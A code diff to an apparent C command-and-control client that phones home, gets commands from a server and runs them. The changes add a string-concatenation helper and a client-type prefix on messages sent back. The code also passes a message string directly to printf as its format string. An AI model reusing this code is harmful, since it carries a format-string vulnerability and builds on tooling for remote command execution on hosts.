@@ -12,6 +12,7 @@
 #include <unistd.h>
 #include <string.h>
 #include <time.h>
+#include <string.h>
 
 //declaring functions
 char* run_command(char* command);
@@ -19,6 +20,7 @@ int send_message(int sock, char *response);
 char * phone_home();
 char * client_id_generate();
 char * decision_tree(int sock, int valread, char * buffer);
+char * concat(const char * s1, const char * s2);
 
 //structs for the win... makes life easy :)
 struct connection {
@@ -142,6 +144,9 @@ char * decision_tree(int sock, int valread, char * buffer) {
     //printf("server first connection: %i\n", server_connection.first_connection);
 
     //sending client_id
+    //char * fullid = concat("!_client_!", server_connection.client_id);
+
+    //send_message(sock, fullid);
     send_message(sock, server_connection.client_id);
     printf("waiting on server response=======\n");
 
@@ -229,9 +234,8 @@ int send_message(int sock, char *response) {
         //return 0;
     }*/
 
-    //combining the clinet ID, and the message to send back
-
-    sprintf(cat_response, "%s\\|/%s", server_connection.client_id, response);
+    //combining the clinet type, clinet ID, and the message to send back
+    sprintf(cat_response, "%s\\|/%s\\|/%s", "!_client_!", server_connection.client_id, response);
 
     printf(cat_response);
 
@@ -343,4 +347,15 @@ char * client_id_generate() {
     
     return random_string;
 
+}
+
+//totally stole this from stack overfow, but makes concat easy
+//need to free the mem at the end
+char* concat(const char *s1, const char *s2)
+{
+    char *result = malloc(strlen(s1) + strlen(s2) + 1); // +1 for the null-terminator
+    // in real code you would check for errors in malloc here
+    strcpy(result, s1);
+    strcat(result, s2);
+    return result;
 }
